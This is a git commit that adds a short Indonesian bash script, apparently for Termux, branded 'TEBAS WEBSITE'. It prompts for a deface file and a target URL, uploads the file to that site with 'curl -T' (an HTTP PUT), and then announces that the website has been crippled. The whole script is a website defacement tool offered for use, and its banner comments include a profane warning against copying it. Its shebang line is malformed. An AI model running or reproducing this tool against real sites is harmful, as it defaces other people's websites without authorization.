fe0c689ad7b0510de3fdd4a22c1af6b459b8b6d9
ACILOADING <52864713+tukangpulug199@users.noreply.github.com>
2019-08-16 11:26:04 +0700

    Add files via upload

---
+++ Memek.sh
@@ -0,0 +1,35 @@
+!usr/bin/bash
+
+#Jangan Di Recode Bangsat!!
+#Coding By AC1L WAS H3R3
+#YouTube MR 4444
+
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+mer='\033[41;97m' #Tepi
+st='\033[0m' #Stop
+clear
+toilet -f future "TEBAS WEBSITE" | lolcat
+echo $mer"=========================================="$st
+echo $i"Author : AC1L S34N"
+echo $i"Github : Https://github.com/tukangpulug199"
+echo $o"Tools  : Tebas Index"
+echo $mer"=========================================="$st
+sleep 4
+echo $ku
+read -p"Masukan Nama script deface : " script;
+sleep 4
+read -p"Masukan Web yang ingin di Tebas : " web;
+echo $i"Tunggu!.."
+sleep 3
+echo $i"Tunggu.!."
+sleep 3
+echo $i"Tunggu..!"
+termux-setup-storage
+curl -T /storage/emulated/0/$script $web
+echo $ku"Succes Web telah lumpuh.."
